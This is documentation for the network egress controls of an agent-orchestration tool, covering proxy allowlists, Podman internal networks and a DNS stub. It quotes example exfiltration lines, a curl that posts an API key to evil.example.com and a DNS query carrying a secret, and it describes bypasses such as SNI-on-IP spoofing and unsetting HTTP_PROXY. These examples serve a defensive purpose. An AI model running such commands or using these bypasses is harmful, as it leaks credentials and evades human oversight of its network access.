# Network egress

This page covers the **egress** boundary — what hosts an agent can
reach outbound. Companion docs: [`sandbox.md`](./sandbox.md) for the
filesystem layer this assumes, and [`auth.md`](./auth.md) for the
secret material whose exfiltration this defends against.

Implementation lives in `src/egress.rs`. End-to-end manual
verification is documented at
[`SMOKE_EGRESS.md`](./SMOKE_EGRESS.md).

## Policy modes

`.fleet/config.yaml`'s `runtime.network` block has three policies:

```yaml
runtime:
  network:
    policy: allowlist       # allowlist | open | none
    extra_hosts:
      - api.linear.app
      - crates.io
```

- **`open`** (default): no enforcement. The container reaches whatever
  the engine + host allow. Matches the pre-egress baseline.
- **`allowlist`**: outbound HTTP/HTTPS is forced through a tinyproxy
  that admits only the hosts in `extra_hosts` plus fleet's built-in
  defaults. Everything else is denied at the proxy.
- **`none`**: reserved for fully-offline workflows; rejects all
  egress at the proxy. (Net result of `allowlist` with an empty
  allowlist.)

The default is `open` so a fresh install Just Works for users who
haven't thought about egress yet. Flip to `allowlist` before running
anything you don't fully trust.

## The two backends

Fleet picks the egress enforcer based on the chosen runtime adapter.
The trait is `EgressEnforcer` (`src/egress.rs`), with three concrete
impls.

### `PodmanTinyproxyEnforcer` (Linux + Podman + `policy: allowlist`)

The strongest config. Five steps at session start:

1. **Internal network.** `podman network create --internal
   fleet-<sid>`. The `--internal` flag means containers on this
   network have no route to the outside; only other containers on
   the same network are reachable.
2. **Tinyproxy sidecar.** A tinyproxy container is run on that
   network with the allowlist baked into its config. The workflow
   container's `HTTP_PROXY` / `HTTPS_PROXY` point at the sidecar's
   hostname on the internal network.
3. **Bridge the proxy outward.** After step 2, the sidecar is
   `podman network connect`-ed to the default `podman` bridge
   network. The sidecar gets a route out; the workflow container
   does not. The two-step is more verbose than `--network=bridge`
   once, but it makes the audit trail clearer: only the sidecar
   ever bridges outward, never the workflow container.
4. **DNS-stub sidecar.** A second sidecar (default image
   `4km3/dnsmasq:latest`) is run on the same `--internal` network.
   At session setup time fleet pre-resolves every allowlist host on
   the host via `getent ahosts`, then starts dnsmasq with `-k
   --no-resolv --no-hosts` plus one `--host-record=name,ip` per
   resolved record. Authoritative behaviour: allowlist names
   resolve to the pre-fetched IPs; everything else returns NXDOMAIN.
5. **Pin the workflow container's resolver.** Fleet inspects the
   DNS sidecar's IP on the internal network and passes
   `--dns=<ip>` to the workflow container's start. The container's
   `/etc/resolv.conf` is overridden to point only at the stub.

Result: the workflow container has exactly one network path —
through the sidecar — and the sidecar refuses CONNECTs to hosts not
on the allowlist. Independently, the container's resolver can only
resolve allowlisted names; queries for any other host fail at the
stub, closing the DNS-exfiltration channel that an unfiltered
upstream resolver would otherwise leak through.

### `HostProxyEnforcer` (macOS Apple Container or Docker + `policy: allowlist`)

The fallback for platforms that don't have a `--internal`-network
primitive equivalent.

1. **Host-side tinyproxy.** Fleet writes a tinyproxy config to a
   tempdir on the host, with the allowlist baked in.
2. **Spawn the daemon.** Fleet invokes `tinyproxy -d` against that
   config; the daemon listens on a local port on the host.
3. **Inject proxy env.** Fleet sets `HTTP_PROXY` /
   `HTTPS_PROXY` on the workflow container to point at the engine's
   host-bridge DNS name (`host.containers.internal` for Apple
   Container, `host.docker.internal` for Docker) plus the chosen
   port.

Result: the workflow container's *cooperative* HTTP clients reach
the proxy; the proxy refuses CONNECTs to disallowed hosts. The host
firewall is not modified; nothing prevents a raw socket inside the
container from dialling the host directly.

This is weaker than the Podman path — see the caveats below. Honest
disclosure on macOS: this is a **guardrail**, not a hard boundary.

### `NoopEnforcer`

Used when `policy: open`, when the adapter is `local`, and as the
fallback when no real enforcer matches the (adapter, policy)
combination. Returns an empty setup; the container behaves as it
would without egress at all.

## The default allowlist

Even with `extra_hosts: []`, fleet adds a small set of defaults
derived from the rest of `.fleet/config.yaml`:

| Host                  | Why                                                                 |
| --------------------- | ------------------------------------------------------------------- |
| `registry-1.docker.io` | The tinyproxy sidecar's own image lives there; the proxy can't bootstrap without it. (Podman backend only.) |
| `api.github.com`, `github.com` | Added when `tracker: github`. Required for `gh issue list / gh pr create`.        |
| `api.anthropic.com`   | Added when any agent's `env_passthrough` mentions `ANTHROPIC`. The claude-code default agent triggers it. |
| `api.openai.com`      | Added when any agent's `env_passthrough` mentions `OPENAI`.         |

The list is computed at proxy-setup time from your config; you don't
maintain it. `extra_hosts` is for everything else — language
registries (`crates.io`, `registry.npmjs.org`, `pypi.org`), your own
internal CDN, the docs site your agent reads.

Wildcards are **not** expanded. `*.crates.io` is a literal string
match against the SNI / Host header. The proxy backend may or may
not honour wildcards — don't rely on it.

## What this protects against

- **Accidental exfiltration.** An agent that runs
  `curl evil.example.com -d $ANTHROPIC_API_KEY` gets a `403 Forbidden`
  from the proxy rather than a successful POST. The agent log shows
  the deny, the secret stays on your account.
- **Honest-mistake fetches.** An agent that pulls from an unintended
  CDN gets a clear deny. Adding the CDN to `extra_hosts` is the fix;
  the deny is loud enough to notice.
- **Background unsolicited connections.** Anything in the image build
  or in the agent's process that dials an unallowed host fails fast.
  No 30-second timeouts; no silent retries swallowing the cost.

## What it does NOT protect against

The egress module's own docstring is the source of truth; the honest
gaps:

- **DNS exfiltration on macOS** (mitigated on Linux + Podman). On
  Linux, fleet ships a DNS-stub sidecar in the same `--internal`
  network as the workflow container. The stub pre-resolves the
  allowlist on the host at session setup, serves those records
  authoritatively, and returns NXDOMAIN for everything else — so a
  query for `${base64 secret}.attacker.com` fails at the stub
  instead of being forwarded to the host resolver. The workflow
  container's `--dns=<stub-ip>` flag wires it up. On macOS (Apple
  Container or Docker), the host-proxy path doesn't have this
  protection: Apple Container has not shipped a network-internal
  primitive equivalent to Podman's `--internal`, and the cooperative
  HOST_PROXY env-only model leaves DNS unfiltered. Mitigation when
  this matters: run on Linux Podman.
- **SNI-on-IP bypass.** A client that sets `curl --resolve
  example.com:1.2.3.4` makes the proxy believe it's talking to
  `example.com` (allowlist'd) while actually connecting to
  `1.2.3.4` (attacker-controlled). tinyproxy filters on the
  CONNECT line, which carries the hostname the client sent.
- **An agent that `unset HTTP_PROXY`** (macOS path). On Linux Podman,
  the workflow container's `--internal` network means there's no
  outbound route except through the sidecar — unsetting the env
  doesn't help, the container has nowhere else to go. On macOS, the
  HostProxyEnforcer is env-only: unsetting `HTTP_PROXY` and dialling
  a raw socket reaches the network directly. This is the cooperative
  bit of the boundary.

## How to add a host

1. Edit `.fleet/config.yaml`:

   ```yaml
   runtime:
     network:
       policy: allowlist
       extra_hosts:
         - registry.npmjs.org
         - your-internal-cdn.example.com
   ```

2. Re-run your workflow. The new allowlist is read at every
   `fleet workflow run` / `resume` / `replay`; no daemon to restart.

The host must match the **SNI** the client sends. `npm` and `pip`
send the hostname you'd expect (`registry.npmjs.org`,
`pypi.org`). `apt` is more involved — apt mirrors use redirector
URLs that change the actual Host header; if `apt update` fails
inside an agent, run it with `apt-get update -o Debug::Acquire=true`
to see which hosts it actually hits and add them.

## How to verify it's actually working

[`SMOKE_EGRESS.md`](./SMOKE_EGRESS.md) is the manual checklist:
deny verification (`curl evil.example.com` → blocked), allow
verification (`curl api.anthropic.com` → allowed), and a quick
look at the proxy logs. Run it once per supported (OS, adapter)
combination after any egress-related change.

## Operations

**See the current policy in effect.**

```sh
fleet runtime doctor
```

Reports the chosen adapter, the configured policy, and the
enforcer that would be selected for a workflow run.

**Tail the sidecar's logs (Podman only).**

```sh
podman logs fleet-proxy-<sid>
```

Where `<sid>` is the session id. Each denied request appears here
with the rejected hostname and the source container.

**Tail the host-side daemon's logs (macOS / Docker).**

The `HostProxyEnforcer` writes its tinyproxy log to a tempfile under
`$TMPDIR/fleet-proxy-<sid>/`. The path is logged at session start;
grep your fleet output for `host-proxy log`.

**Disable enforcement to debug.**

```yaml
runtime:
  network:
    policy: open
```

Lifts the proxy for the whole repo. Use sparingly — and remember
to flip back before running anything untrusted.
